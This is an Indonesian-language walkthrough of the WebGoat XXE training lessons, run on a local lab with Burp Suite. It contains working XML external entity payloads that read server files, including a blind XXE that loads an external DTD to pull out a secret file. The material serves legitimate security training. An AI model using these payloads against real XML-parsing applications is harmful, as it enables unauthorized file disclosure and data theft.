# XXE
XXE adalah jenis serangan terhadap aplikasi yang mem-parsing input XML. Serangan ini terjadi ketika input XML yang berisi referensi ke entitas eksternal diproses oleh parser XML yang terkonfigurasi dengan lemah.

## Let’s try
- Jalankan tool Burp Suite terlebih dahulu
- Buka halaman http://127.0.0.1:9001/WebGoat/start.mvc#lesson/XXE.lesson/3 lalu tekan tombol **Submit**

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/XXE/xxe%201.JPG)

- Buka Burp Suite dan cari request yang mengarah ke path URL **/WebGoat/xxe/simple**. Klik kanan di request tersebut lalu pilih **Send to Repeater**

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/XXE/xxe%202.JPG)

- Pindah ke tab Repeater

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/XXE/xxe%203.JPG)

- Ganti XML yang terdapat di request menjadi sebagai berikut 
```sh
<?xml version="1.0"?><!DOCTYPE comment [<!ENTITY xxe SYSTEM "file:///">]><comment><text>&xxe;</text></comment>
```

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/XXE/xxe%204.JPG)

- Jika sudah tekan tombol **Send** maka kita berhasil menyelesaikan tugas ini

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/XXE/xxe%205.JPG)

## Modern REST framework
- Jalankan tool Burp Suite terlebih dahulu
- Pergi ke halaman http://127.0.0.1:9001/WebGoat/start.mvc#lesson/XXE.lesson/6 tulis komentar anda lalu tekan tombol **Submit**

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/XXE/xxe%206.JPG)

- Buka Burp Suite dan cari request yang mengarah ke path URL **/WebGoat/xxe/content-type**. Klik kanan di request tersebut lalu pilih **Send to Repeater**

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/XXE/xxe%207.JPG)

- Pindah ke tab Repeater

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/XXE/xxe%208.JPG)

- Ganti Content-Type di request dari **application/json** menjadi **application/xml**

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/XXE/xxe%209.JPG)

- Ganti isi komentar dari format json menjadi XML dengan data sebagai berikut
```sh
<?xml version="1.0"?><!DOCTYPE comment [<!ENTITY xxe SYSTEM "file:///">]><comment><text>&xxe;</text></comment>
```

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/XXE/xxe%2010.JPG)

- Jika sudah tekan tombol **Send** maka kita berhasil menyelesaikan tugas ini

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/XXE/xxe%2011.JPG)

## Blind XXE assignment
- Buka halaman http://127.0.0.1:9001/WebGoat/start.mvc#lesson/XXE.lesson/10 disini sudah tertulis file mana yang harus diserang tanpa perlu memindai direktori terlebih dahulu

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/XXE/xxe%2012.JPG)

- Buat sebuah file DTD yang berisi kode berikut ini lalu simpan dengan nama **xxe.dtd**
```sh
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY secret SYSTEM 'file:///home/kali/.webgoat-2023.4//XXE/testing/secret.txt'>
```
- Login ke web wolf di tab baru melalui url http://127.0.0.1:9090/login dan login menggunakan akun yang anda gunakan di webgoat

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/XXE/xxe%2013.JPG)

- Pergi ke menu Files

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/XXE/xxe%2014.JPG)

- Unggah file **xxe.dtd**

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/XXE/xxe%2015.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/XXE/xxe%2016.JPG)

- Jika sudah berhasil terunggah klik kanan pada link lalu pilih Copy Link dan paste link di sebuah editor. Disini link file **xxe.dtd** yang kita peroleh adalah http://127.0.0.1:9090/files/testing/xxe.dtd

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/XXE/xxe%2017.JPG)

- Jalankan tool Burp Suite dan pastikan Intercept dalam kondisi On

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/XXE/xxe%2018.JPG)

- Pindah ke tab halaman http://127.0.0.1:9001/WebGoat/start.mvc#lesson/XXE.lesson/10 kemudian tulis sebuah komentar dan tekan tombol **Submit**

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/XXE/xxe%2019.JPG)

- Setelah Burp Suite terbuka pastikan request mengarah ke path URL **/WebGoat/xxe/blind**. Jika belum anda dapat menekan tombol Forward beberapa kali hingga menemukan request tersebut

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/XXE/xxe%2020.JPG)

- Ganti komentar dengan kode XML sebagai berikut, cantumkan link file **xxe.dtd** kemudian tekan tombol **Forward**
```sh
<?xml version="1.0"?>
<!DOCTYPE lesson11 [
<!ENTITY % lesson11dtd SYSTEM "http://127.0.0.1:9090/files/testing/xxe.dtd">
%lesson11dtd;
]>
<comment>
<text>command &secret;</text>
</comment>
```

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/XXE/xxe%2021.JPG)

- Kembali ke halaman http://127.0.0.1:9001/WebGoat/start.mvc#lesson/XXE.lesson/10 jika anda melakukan instruksi diatas dengan benar, maka akan muncul komentar seperti ini

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/XXE/xxe%2022.JPG)

- Buka Burp Suite dan matikan intercept

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/XXE/xxe%2023.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/XXE/xxe%2024.JPG)

- Copy isi komentar diatas lalu paste di field komentar dan tekan tombol **Submit**

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/XXE/xxe%2025.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/XXE/xxe%2026.JPG)